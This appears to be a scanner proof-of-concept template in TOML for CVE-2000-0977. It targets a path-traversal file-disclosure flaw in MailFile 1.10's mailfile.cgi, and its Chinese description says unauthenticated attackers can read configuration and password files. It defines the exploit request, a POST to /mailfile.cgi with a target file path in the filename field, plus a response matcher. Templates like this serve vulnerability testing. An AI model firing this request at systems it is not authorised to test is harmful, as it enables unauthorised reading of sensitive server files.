[info]
author = "ave"
description = "利用 MailFile 1.10 软件中的 mailfile.cgi CGI 程序漏洞，通过路径遍历攻击技术向目标服务器提交包含任意文件路径的 POST 请求，实现对目标服务器敏感文件（如配置文件、密码文件等）的远程读取。该漏洞影响广泛，攻击者无需任何身份验证即可远程执行攻击，攻击难度较低。"
id = "POC-AVE-2000-0713"
name = "CVE-2000-0977 Arbitrary File Disclosure PoC"
severity = "high"
tags = ["ave-2000-0713"]
vuln_id = [
    "CVE-2000-0977",
    "AVE-2000-0713",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/mailfile.cgi"
protocol = "http"

[poc.requests.body]
content = "filename={{TargetFilePath}}"
type = "form"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["file content"]
